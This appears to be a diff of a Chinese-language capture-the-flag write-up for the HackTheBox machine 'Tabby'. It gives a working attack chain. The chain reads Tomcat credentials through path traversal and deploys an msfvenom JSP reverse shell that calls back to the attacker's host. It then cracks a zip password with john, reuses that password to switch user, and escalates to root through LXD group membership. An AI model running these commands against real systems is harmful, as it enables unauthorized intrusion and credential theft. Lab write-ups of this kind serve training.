@@ -156,51 +156,260 @@ NOTE: For security reasons, using the manager webapp is restricted to users with
 
 查看目录结构
 ```
-┌──(root💀kali)-[~/htb/Tabby/apache-tomcat-9.0.31]
+┌──(root💀kali)-[/var/lib/tomcat9]
 └─# ls
-bin           conf             lib      logs    README.md      RUNNING.txt  webapps
-BUILDING.txt  CONTRIBUTING.md  LICENSE  NOTICE  RELEASE-NOTES  temp         work
+bin  BUILDING.txt  conf  CONTRIBUTING.md  lib  LICENSE  logs  NOTICE  README.md  RELEASE-NOTES  RUNNING.txt  temp  webapps  work
+
 
 ```
 
 conf
 ```
-┌──(root💀kali)-[~/htb/Tabby/apache-tomcat-9.0.31/conf]
+┌──(root💀kali)-[/var/lib/tomcat9/conf]
 └─# ls
-Catalina         catalina.properties  jaspic-providers.xml  logging.properties  tomcat-users.xml  web.xml
-catalina.policy  context.xml          jaspic-providers.xsd  server.xml          tomcat-users.xsd
+catalina.policy  catalina.properties  context.xml  jaspic-providers.xml  jaspic-providers.xsd  logging.properties  server.xml  tomcat-users.xml  tomcat-users.xsd  web.xml
 
 ```
 
 
-conf文件夹应该跟```webapps```在同一级，但是浏览器上一直无法回显。。。
+```conf```文件夹应该跟```webapps```在同一级，但是浏览器上一直无法回显。。。
 
 
+查看本地tomcat9，好像没啥文件有读权限的。
+
+## curl
 
 
+后来看论坛提示，要直接用```apt install tomcat9```安装
+
+查看```tomcat-users.xml```位置
+
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# find / -name tomcat-users.xml
+/etc/tomcat9/tomcat-users.xml
+/usr/share/tomcat9/etc/tomcat-users.xml
+
+```
+
+```/etc/tomcat9/tomcat-users.xml ```普通用户没有读取权限
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# ls -alh /etc/tomcat9/tomcat-users.xml           
+-rw-r----- 1 root tomcat 2.7K 11月 10 03:15 /etc/tomcat9/tomcat-users.xml
+
+```
+
+但是```/usr/share/tomcat9/etc/tomcat-users.xml```普通用户是可读的
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# ls -alh /usr/share/tomcat9/etc/tomcat-users.xml 
+-rw-r--r-- 1 root root 2.7K 11月 10 03:15 /usr/share/tomcat9/etc/tomcat-users.xml
+
+```
+
+使用paylaod```http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml```用网页打开，需要打开网页源代码才能显示配置
+
+但是用curl可以马上回显
+
+```curl -X GET -H 'Content-type:text/xml'  http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml```
+
+tomcat-users.xml配置信息
+```
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+  <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+</tomcat-users>
+```
+
+得到一个tomcat的后台账号：```tomcat:$3cureP4s5w0rd123!```
 
 
-<role rolename="manager-gui"/>
-<user username="tomcat" password="tomcat" roles="manager-gui"/>
+然而这个权限只是```admin-gui```和```manager-script```,不是```manager-gui```,因此我们无法打开manger页面，无法使用exp
 
-<role rolename="admin-gui"/>
-<user username="tomcat" password="tomcat" roles="admin-gui"/>
+但是后来发现使用 curl是可以访问到manager的后台文件的
+
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:2:/usr/share/tomcat9-admin/host-manager
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+
+```
+
+参考[hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)里的方法
+
+编译反弹shell
+```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.3 LPORT=4242 -f war -o revshell.war```
 
 
+上传反弹shell
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# curl --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/revshell"
+OK - Deployed application at context path [/revshell]
 
-CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9
+```
 
-/var/lib/tomcat9/conf/server.xml
-
-
-
-https://downloads.apache.org/tomcat/tomcat-9/v9.0.31/bin/apache-tomcat-9.0.31.tar.gz
+浏览器打开：```http://10.10.10.194:8080/revshell/```
 
 
-/usr/share/tomcat9/conf/tomcat-users.xml
+拿到反弹shell
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.194] 50070
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 
-echo 'xxxx  '| curl -X POST -H 'Content-type:text/xml' -d @-  http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml
+```
 
-cat 1.xml | curl -X GET -H 'Content-type:text/xml'  http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml
+# user
 
-curl http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml -H "Accept: application/xml" 
+在```/var/www/html/files```找到一个加密zip文件```16162020_backup.zip```
+
+下载到本地后用zip2john转成john可以识别的格式
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# /usr/sbin/zip2john 16162020_backup.zip >zip.hash   
+16162020_backup.zip/var/www/html/assets/ is not encrypted!
+ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
+ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
+ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+```
+破解获取到一个密码
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (16162020_backup.zip)
+1g 0:00:00:01 DONE (2021-12-31 03:15) 0.7246g/s 7509Kp/s 7509Kc/s 7509KC/s adnc153..adenabuck
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+```
+
+解密zip
+```
+┌──(root💀kali)-[~/htb/Tabby]
+└─# unzip 16162020_backup.zip
+Archive:  16162020_backup.zip
+[16162020_backup.zip] var/www/html/favicon.ico password: 
+  inflating: var/www/html/favicon.ico  
+   creating: var/www/html/files/
+  inflating: var/www/html/index.php  
+ extracting: var/www/html/logo.png   
+  inflating: var/www/html/news.php   
+  inflating: var/www/html/Readme.txt
+```
+然而没有找到任何有用的文件，尝试 使用破解的密码登陆ash的账号
+
+```
+tomcat@tabby:~$ su ash
+su ash
+Password: admin@it
+
+ash@tabby:/opt/tomcat$ id 
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+ash@tabby:/opt/tomcat$ whoami
+whoami
+ash
+
+```
+
+成功了。
+
+# root
+
+查看组用户信息，发现ash账号在lxd用户组
+```
+ash@tabby:/var/lib/tomcat9$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+
+```
+
+按照[hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)Method 2里的提权方法
+
+
+kali端：
+下载仓库到本地
+
+```git clone https://github.com/saghul/lxd-alpine-builder```
+
+编译：
+```
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+```
+
+攻击机用python开启一个http服务，传编译好的镜像文件到靶机
+
+
+```wget http://10.10.16.3:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz```
+
+靶机端加载靶机，初始化。注意：此操作不能在```/tmp```目录下执行，只能在```/home/ash/```下
+```
+ash@tabby:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+ash@tabby:~$ lxd init
+
+```
+一路按默认。
+
+提权到root
+```
+ash@tabby:~$ lxc init myimage mycontainer -c security.privileged=true
+lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+ash@tabby:~$ lxc start mycontainer
+lxc start mycontainer
+ash@tabby:~$ lxc exec mycontainer /bin/sh
+lxc exec mycontainer /bin/sh
+~ # ^[[50;5Rid
+id
+uid=0(root) gid=0(root)
+~ # ^[[50;5Rwhoami
+whoami
+root
+
+```
+
+找到root.txt
+```
+~ # ^[[50;5Rfind / -name root.txt
+find / -name root.txt
+/mnt/root/root/root.txt
+
+```
+
+# 总结
+Foothold是最难的部分，如果不明白tomcat的配置，不使用curl探测就无法拿到初始shell。```hacktricks```真是我们的好朋友！没有思路的时候一定要常常看看。
+user很简单。
+提权到root时，一开始在```/tmp```目录操作一直报错说找不到镜像文件的路径。后来想想docker里这些路径可能会有些奇怪
+尝试从lxd管理员ash的家目录加载，终于成功了。
